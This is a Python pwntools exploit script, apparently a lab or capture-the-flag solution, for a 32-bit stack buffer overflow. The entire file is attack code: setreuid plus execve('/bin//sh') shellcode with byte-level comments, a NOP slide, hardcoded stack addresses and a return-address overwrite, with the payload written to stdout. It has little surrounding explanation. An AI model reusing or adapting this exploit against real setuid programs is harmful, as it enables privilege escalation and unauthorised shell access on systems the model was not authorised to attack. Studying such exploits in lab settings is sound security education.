import sys
from pwn import *

# print(cyclic(140))  # Generate a 100-byte cyclic pattern

# crash_addr = 0x62616162
# print(cyclic_find(crash_addr))
# find after how many bytes the ret-address is found, in this case, 104.

NOP_SLIDE = 50

# print = lambda *args, **kwargs: None # override print function

# setreuid(geteuid(), geteuid())
# execv("/bin//sh", argv)

# Shellcode in Python
shellcode = (
    b"\x6a\x31"  # push 0x31 (49)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (geteuid())

    b"\x89\xc3"  # mov ebx, eax (uid)
    b"\x89\xd9"  # mov ecx, ebx
    b"\x6a\x46"  # push 0x46 (70)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80, setreuid(geteuid(), geteuid())

    b"\x31\xd2"  # xor edx, edx
    b"\x52"      # push edx, which is \0
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"  # mov ebx, esp (now ebx contains: "/bin//sh",\x00)

    b"\x52"      # push edx (push NULL into stack)
    b"\x53"      # push ebx (push pathname)
    b"\x89\xe1"  # mov ecx, esp (ecx is argv)

    b"\xb0\x0b"  # mov al, 0x0b (11)
    b"\xcd\x80"  # int 0x80 (execv("/bin//sh", argv))

        # mv eax, 1         ; system call number (sys_exit)
    b"\x6a\x01"  # push 1
    b"\x58"      # pop eax (sys_exit)
    # int 0x80
    b"\xcd\x80"  # int 0x80 (exit())
)

nop_slide = b"\x90" * NOP_SLIDE
shellcode = nop_slide + shellcode


shellcode_address = 0xffffd1b0
buffer_address = 0xffffd198

payload = p32(shellcode_address)
payload += shellcode
payload += b'a' * (140-len(payload))

payload += p32(buffer_address)

sys.stdout.buffer.write(payload)
